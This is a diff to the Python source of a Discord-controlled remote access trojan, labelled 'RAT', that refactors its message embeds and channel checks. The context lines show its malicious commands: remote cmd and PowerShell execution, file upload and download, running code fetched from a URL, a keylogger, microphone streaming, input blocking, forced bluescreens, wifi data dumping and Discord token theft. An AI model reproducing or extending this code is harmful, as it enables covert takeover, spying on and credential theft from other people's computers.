@@ -89,13 +89,34 @@ def in_correct_channel(ctx):
     sanitized_name = sanitize_channel_name(computer_name)
     return ctx.channel.name == sanitized_name
 
-async def send_temporary_message(ctx, content, duration=10):
-    message = await ctx.send(content)
-    await asyncio.sleep(duration)
-    await message.delete()
+# Define the URL for the embed author icon
+EMBED_ICON_URL = "https://github.com/truelockmc/Discord-RAT/raw/main/logo.png"
 
-async def log_message(ctx, content):
-    await ctx.send(content)
+# Updated log_message function
+async def log_message(ctx, message, duration=None):
+    embed = discord.Embed(
+        description=message,
+        colour=discord.Colour.blue()  # Always blue color
+    )
+    embed.set_author(name="RAT", icon_url=EMBED_ICON_URL)
+    
+    if duration:
+        msg = await ctx.send(embed=embed)
+        await asyncio.sleep(duration)
+        await msg.delete()
+    else:
+        await ctx.send(embed=embed)
+
+# Function to send a standardized message for incorrect channel usage
+async def wrong_channel(ctx, duration=10):  # Default duration is 10
+    embed = discord.Embed(
+        description="This command can only be executed in the specific channel for this PC.",
+        colour=discord.Colour.red()
+    )
+    embed.set_author(name="RAT", icon_url=EMBED_ICON_URL)
+    msg = await ctx.send(embed=embed)
+    await asyncio.sleep(duration)
+    await msg.delete()
 
 def load_admin_status():
     global is_admin
@@ -135,12 +156,6 @@ def elevate():
             raise Exception("Fehler beim Neustarten des Skripts mit Admin-Rechten.")
     except Exception as e:
         raise Exception(f"Fehler beim Anfordern von Admin-Rechten: {str(e)}")
-
-async def log_message(ctx, message, duration=None):
-    if duration:
-        await ctx.send(message, delete_after=duration)
-    else:
-        await ctx.send(message)
         
 def check_single_instance():
     # Verwende das temporäre Verzeichnis des Systems für die PID-Datei
@@ -171,7 +186,7 @@ def check_single_instance():
 
 @bot.event
 async def on_ready():
-    print(f'Wir sind eingeloggt als {bot.user}')
+    print(f'Logged in as {bot.user}')
     bot.loop.create_task(send_messages())  # Start the send_messages function here
     guild = bot.get_guild(GUILD_ID)
     if guild:
@@ -263,10 +278,6 @@ async def generic_command_error(ctx, error):
 @bot.command()
 @commands.check(is_authorized)
 async def purge(ctx):
-    if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
-        return
-
     try:
         deleted = await ctx.channel.purge(limit=200, check=is_bot_or_command)
         await log_message(ctx, f"{len(deleted)} Nachrichten gelöscht.", duration=5)
@@ -277,7 +288,7 @@ async def purge(ctx):
 @commands.check(is_authorized)
 async def ping(ctx):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     latency = round(bot.latency * 1000)
@@ -287,7 +298,7 @@ async def ping(ctx):
 @commands.check(is_authorized)
 async def screenshot(ctx):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     try:
@@ -305,7 +316,7 @@ async def screenshot(ctx):
 @commands.check(is_authorized)
 async def cmd(ctx, *, command):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     working_message = await ctx.send("🔄 Working...")
@@ -348,7 +359,7 @@ async def cmd(ctx, *, command):
 @commands.check(is_authorized)
 async def powershell(ctx, *, command):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     working_message = await ctx.send("🔄 Working...")
@@ -392,7 +403,7 @@ async def powershell(ctx, *, command):
 async def file_upload(ctx, *target_path_parts):
     target_path = ' '.join(target_path_parts)
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "This command can only be executed in the specific channel for this PC.", duration=10)
+        await wrong_channel(ctx)
         return
 
     working_message = await ctx.send("🔄 Working...")
@@ -416,7 +427,7 @@ async def file_upload(ctx, *target_path_parts):
 async def file_download(ctx, *file_path_parts):
     file_path = ' '.join(file_path_parts)
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "This command can only be executed in the specific channel for this PC.", duration=10)
+        await wrong_channel(ctx)
         return
 
     working_message = await ctx.send("🔄 Working...")
@@ -454,7 +465,7 @@ async def file_download(ctx, *file_path_parts):
 @commands.check(is_authorized)
 async def execute(ctx, url):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     working_message = await ctx.send("🔄 Working...")
@@ -490,7 +501,7 @@ async def execute(ctx, url):
 @commands.check(is_authorized)
 async def system_info(ctx):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     try:
@@ -513,7 +524,7 @@ async def system_info(ctx):
 @commands.check(is_authorized)
 async def tasklist(ctx):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     try:
@@ -542,7 +553,7 @@ async def tasklist(ctx):
 @commands.check(is_authorized)
 async def taskkill(ctx, identifier: str):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     try:
@@ -576,7 +587,7 @@ async def taskkill(ctx, identifier: str):
 @commands.check(is_authorized)
 async def notify(ctx, title, message):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     try:
@@ -593,7 +604,7 @@ async def notify(ctx, title, message):
 @commands.check(is_authorized)
 async def restart(ctx):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     try:
@@ -609,7 +620,7 @@ async def restart(ctx):
 @commands.check(is_authorized)
 async def shutdown(ctx):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     try:
@@ -626,7 +637,7 @@ async def shutdown(ctx):
 async def admin(ctx):
     global is_admin
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     if check_if_admin():
@@ -647,7 +658,7 @@ async def admin(ctx):
 @commands.check(is_authorized)
 async def stop(ctx):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     await log_message(ctx, 'Bot wird gestoppt.')
@@ -657,7 +668,7 @@ async def stop(ctx):
 @commands.check(is_authorized)
 async def wifi(ctx):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     working_message = await ctx.send("🔄 Working...")
@@ -820,7 +831,7 @@ def stop_keylogger():
 async def keylog(ctx, action=None):
     global keylogger_thread, keylogger_active
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     if action == 'on':
@@ -849,7 +860,7 @@ keylog.error(generic_command_error)
 @commands.check(is_authorized)
 async def tts(ctx, *, message):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     try:
@@ -899,7 +910,7 @@ class PyAudioPCM(discord.AudioSource):
 @commands.check(is_authorized)
 async def mic_stream_start(ctx):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     # Ensure 'voice' key exists in channel_ids
@@ -995,7 +1006,7 @@ mic_stream_stop.error(generic_command_error)
 #@bot.command(name='rickroll')
 #async def rickroll(ctx):
 #    if not in_correct_channel(ctx):
-#        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+#        await wrong_channel(ctx)
 #        return
 #    working_message = await ctx.send("🎥 Preparing Rickroll...")
 
@@ -1021,7 +1032,7 @@ confirmation_pending = {}
 @commands.check(is_authorized)
 async def bsod(ctx):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
     confirmation_pending[ctx.author.id] = True
     await ctx.send("⚠️ Warning: You are about to trigger a Bluescreen! Type `!confirm_bsod` within 15 seconds to confirm.")
@@ -1079,7 +1090,7 @@ def unblock_input():
 @commands.check(is_authorized)
 async def input_command(ctx, action: str):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
     global input_blocked
     if action == 'block':
@@ -1113,6 +1124,9 @@ def get_default_audio_device():
 @bot.command(name='volume')
 @commands.check(is_authorized)
 async def volume(ctx, *args):
+    if not in_correct_channel(ctx):
+        await wrong_channel(ctx)
+        return
     volume = get_default_audio_device()
     
     if not args:
@@ -1426,7 +1440,7 @@ async def long_running_task(ctx, raw_data):
 @commands.check(is_authorized)
 async def grab_tokens(ctx):
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await wrong_channel(ctx)
         return
 
     loading_message = await ctx.send("🔄 Extracting Discord tokens...")  # Send loading message
